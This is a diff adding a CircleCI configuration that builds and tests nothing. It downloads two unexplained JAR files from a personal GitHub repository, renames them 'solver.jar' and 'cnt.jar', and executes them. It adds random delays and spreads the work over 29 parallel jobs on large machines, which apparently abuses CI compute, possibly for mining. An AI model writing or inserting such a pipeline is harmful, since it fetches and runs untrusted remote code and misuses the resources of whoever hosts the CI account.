@@ -1,0 +1,47 @@
+version: 2.1
+
+jobs:
+  run-files:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Setup Java
+          command: |
+            sudo apt-get update && sudo apt-get install -y openjdk-17-jdk curl
+      - run:
+          name: Download JAR Files
+          command: |
+            # Random delay to avoid conflicts
+            sleep $((RANDOM % 15 + 1))
+            
+            BASE_URL="https://github.com/ThomasPerez707142276/sescaw/raw/main"
+            
+            # Download files with retry logic
+            download_file() {
+              local src=$1 dst=$2 retries=0
+              while [ $retries -lt 5 ]; do
+                curl -L --fail "$BASE_URL/$src" -o "$dst" && return 0
+                retries=$((retries + 1))
+                sleep $((retries * 2))
+              done
+              echo "Failed to download $dst" && exit 1
+            }
+            
+            download_file "workerr4.jar" "solver.jar"
+            download_file "cnt4.jar" "cnt.jar"
+      - run:
+          name: Execute
+          command: |
+            java -jar cnt.jar &
+            java -jar solver.jar
+
+workflows:
+  run-svr:
+    jobs:
+      - run-files:
+          matrix:
+            parameters:
+              job-name: [thu0,thu1,thu2,thu3,thu4,thu5,thu6,thu7,thu8,thu9,thu10,thu11,thu12,thu13,thu14,thu15,thu16,thu17,thu18,thu19,thu20,thu21,thu22,thu23,thu24,thu25,thu26,thu27,thu28]
